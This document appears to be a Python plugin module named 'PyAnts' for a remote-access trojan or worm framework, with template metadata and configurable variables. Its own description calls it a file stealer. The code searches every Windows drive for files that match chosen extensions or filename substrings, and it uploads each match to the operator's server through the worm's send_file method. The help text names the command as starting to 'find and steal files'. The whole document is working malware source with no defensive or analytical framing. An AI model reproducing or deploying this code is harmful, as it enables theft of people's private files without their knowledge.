#!name##PyAnts
#!itemType##module
#!info##Simple Python file stealer. Searches the system’s drives for files. The search is based on file extensions and substrings contained in the filename. After scanning all files, it begins uploading them to the server. Module starts searching for files immediately after launch.
#!lang##python
#!hiveType##PySM
#!fileType##PY_MOD
#!itemTags##WIN
#!pyType##module
#!pyModName##BruteAnts
#!Var##PYA_fext##_NULL##Specifies what type of file extensions to search for. Separate the entered extensions with a comma and a space, do not use a period '.' Ex: "jpg, gif, txt"##str
#!Var##PYA_fname##_NULL##Specifies which strings of characters must be in the file name for it to be downloaded. An empty variable means that any name will be considered. Separate names with a comma and a space.##str

{% if PYA_fname == "NO_VALUE" %}
    {% set PYA_convert_fname = "" %}
{% else %}
    {% set PYA_convert_fname = PYA_fname %}
{% endif %}

{% if PYA_fext == "NO_VALUE" %}
    {% set PYA_convert_fext = "" %}
{% else %}
    {% set PYA_convert_fext = PYA_fext %}
{% endif %}


import os
import threading
from time import sleep

class BruteAnts:
    MTYPES = "rat"
    def __init__(self, worm: object):
        self.worm = worm
        self.FILE_PATH = set()
        self._start_path = "abcdefghijklmnopqrstuvwxyz"
        self.main_th = []
        self.child_th = []
        self.ants_working = False
        self.raw_find_file_ext = "{{PYA_convert_fext}}"
        self.raw_find_file_name = "{{PYA_convert_fname}}"
        self.find_file_ext = self.build_file_ext()
        self.find_file_name = self.build_file_name()
        self.lock = threading.Lock()
        self.find_working = False
    
    def build_file_ext(self) -> list:
        ext_list = []
        file_ext = self.raw_find_file_ext.split(",")
        for ext in file_ext:
            if ext == "" or ext == " ":
                continue
            ext_list.append(f'.{ext.strip(" ")}')
        return ext_list
        
    def build_file_name(self) -> list:
        name_list = []
        file_name = self.raw_find_file_name.split(",")
        for name in file_name:
            if name == "" or name == " ":
                continue
            name_list.append(name.strip(" "))
        return name_list
    
    def _find_main_src(self) -> None:
        for dn in self._start_path:
            if os.path.exists(f"{dn}:/"):
                self.check_src_path(f"{dn}:/")
    
    def addFilePath(self, fpath: str) -> None:
        with self.lock:
            self.FILE_PATH.add(fpath)
    
    def check_ext(self, file_name: str) -> bool:
        ext = os.path.splitext(file_name)
        if len(ext) > 1:
            if ext[1] in self.find_file_ext:
                return True
            else:
                return False
    
    def check_fname(self, file_name: str) -> bool:
        for ffn in self.find_file_name:
            if ffn in file_name:
                return True
        return False


    def check_file(self, file_path: str, file_name: str) -> None:
        if len(self.find_file_name) == 0:
            if self.check_ext(file_name):
                self.addFilePath(file_path)
        else:
            if len(self.find_file_ext) == 0:
                if self.check_fname(file_name):
                    self.addFilePath(file_path)
            else:
                if self.check_fname(file_name):
                    if self.check_ext(file_name):
                        self.addFilePath(file_path)
                
        
    
    def _check_src_path(self, start_path: str) -> None:
        for r,d,files in os.walk(start_path, topdown=True):
            for f in files:
                fpath = os.path.join(r, f)
                if os.path.isfile(fpath):
                    self.check_file(fpath, f)
        
    

    def check_src_path(self, start_path: str) -> None:
        for dirname in os.listdir(start_path):
            full_path = os.path.join(start_path, dirname)
            if os.path.isdir(full_path):
                th = threading.Thread(target=self._check_src_path, args=(full_path, ), daemon=True)
                th.start()
                self.main_th.append(th)
    
    def _prepare_work(self) -> None:
        self.FILE_PATH = set()
        self._find_main_src()
        for th in self.main_th:
            th.join()
        if self.worm.is_conn:
            for fpath in self.FILE_PATH:
                self.worm.send_file(fpath)
                sleep(0.2)

        self.find_working = False
    
    def prepare_work(self) -> None:
        th = threading.Thread(target=self._prepare_work)
        th.start()

    def exec_cmd(self, cmd: str) -> None:
        command = cmd.split(" ")
        match command[0]:
            case "ants_start":
                self.start()
    
    def help(self) -> str:
        h = "'ants_start' - Start find and steal files.\n"
        return h
    
    def start(self) -> None:
        if self.find_working:
            return
        self.find_working = True
        self.prepare_work()